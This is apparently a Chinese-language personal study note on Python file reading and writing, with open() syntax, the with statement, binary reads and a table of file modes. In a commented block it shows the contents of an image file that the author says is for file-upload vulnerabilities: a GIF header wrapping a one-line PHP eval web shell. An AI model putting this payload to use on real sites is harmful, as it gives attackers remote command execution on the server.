### 基本语法

```python
open('文件地址','读写模式',encoding='编码格式')
```

最开始的写法：

```python
try:
    f = open('工程学习\Pyhton\基本\基本库学习\IO编程\demo.txt','r',encoding='utf-8')
    print(f.read())
finally:
    if f:
        f.close()
```

常用规范写法：

```python
with open('工程学习\Pyhton\基本\基本库学习\IO编程\demo.txt','r',encoding='utf-8') as f:
    #print(f.read())
    for line in f.readlines():
        print(line.strip())
```



### 读

#### 读取图片（二进制文件）

```python
#读取二进制文件
#第一个图片是用于文件上传漏洞的
"""
with open("工程学习\Pyhton\基本\基本库学习\IO编程\muma.jpg",'rb') as f:
    print(f.read())

b"GIF89a\r\n<script language='php'>@eval($_REQUEST['shell']);</script>\r\n"
"""

with open("工程学习\Pyhton\基本\基本库学习\IO编程\mylogo.jpg",'rb') as f:
    print(f.read())
    
# xef\xaf]\xa4\xbfn\xc5\x14wc\x88\x83\x8f/\x0c\xd6\x7f\x9f\xf1\xd1s\xc0\xfb{g9~$k\x99e\x91Bj~FE\xcf\xd0\x1c\xd5Z\xb1s\x06.\x8cQG\'\x88S\x86o\xf9v\xa6\xcfo,\x04\tUW#a\xa8\x13\xf4\x15\xaa/F9-\x8c\x87b\xd9\xea\x86\xa2\x07*w\xc1\xe4\x0f\x9d=N\x18\xfaTc\x96)\xfb\x0b.q\t-\xdc@\xb6\x82\xed \nZ4\x9eP\xe0\x02w\xc6\x00\x03\xbd\xaa\xaf\xfb9\xc2\xc5\xd4\x92]][\xccmQ\x19Vh\xd0\xb0Yv*0\x06w\xc1\x1c\xba\xd6,\xa7\t\x10\xc2\x8c)\x04\x8c\xe5\xb7\xe6~\xbfj\xe8\xe3\xb8\xfe\t\xec\xf5\xb4\xf62<3\xdd\xbe\xa9a\xb9\x84ku\x1bwH\x18)\x9c\xecp|*\xa9\xe9R-\x82\xb9[!\xbc\xf6VkH^Y\xa5~\xd1\xc8\x10D\x10\xb1v;\xeeyr\xcf*l^\xc4{M<BD\xe1.\x11\x87t\xbc\xb1\xa9?"\xc0\.....
```



### 写

调整模式

```python
with open("工程学习\Pyhton\基本\IO编程\demo.txt",'w',encoding="utf-8") as f:
    f.write("Hello world")
```

> 但是'w'模式，会清空原内容，然后再写入



各种模式如下：

| 模式  | 描述                                                         |
| ----- | ------------------------------------------------------------ |
| `r`   | 读取模式，文件必须存在，否则抛出 `FileNotFoundError`         |
| `w`   | 写入模式，如果文件已存在则清空内容，如果文件不存在则创建新文件 |
| `a`   | 追加模式，如果文件已存在则在末尾追加内容，如果文件不存在则创建新文件 |
| `rb`  | 二进制模式读取，文件必须存在，否则抛出 `FileNotFoundError`   |
| `wb`  | 二进制模式写入，如果文件已存在则清空内容，如果文件不存在则创建新文件 |
| `ab`  | 二进制模式追加，如果文件已存在则在末尾追加内容，如果文件不存在则创建新文件 |
| `r+`  | 读写模式，文件必须存在，否则抛出 `FileNotFoundError`         |
| `w+`  | 读写模式，如果文件已存在则清空内容，如果文件不存在则创建新文件 |
| `a+`  | 读写模式，如果文件已存在则在末尾追加内容，如果文件不存在则创建新文件 |
| `rt`  | 文本模式读取，等同于 `r`                                     |
| `wt`  | 文本模式写入，等同于 `w`                                     |
| `at`  | 文本模式追加，等同于 `a`                                     |
| `x`   | 独占创建模式，文件必须不存在，否则抛出 `FileExistsError`     |
| `x+`  | 独占创建并读模式，文件必须不存在，否则抛出 `FileExistsError` |
| `rb+` | 二进制模式读写，文件必须存在，否则抛出 `FileNotFoundError`   |
| `wb+` | 二进制模式读写，如果文件已存在则清空内容，如果文件不存在则创建新文件 |
| `ab+` | 二进制模式读写，如果文件已存在则在末尾追加内容，如果文件不存在则创建新文件 |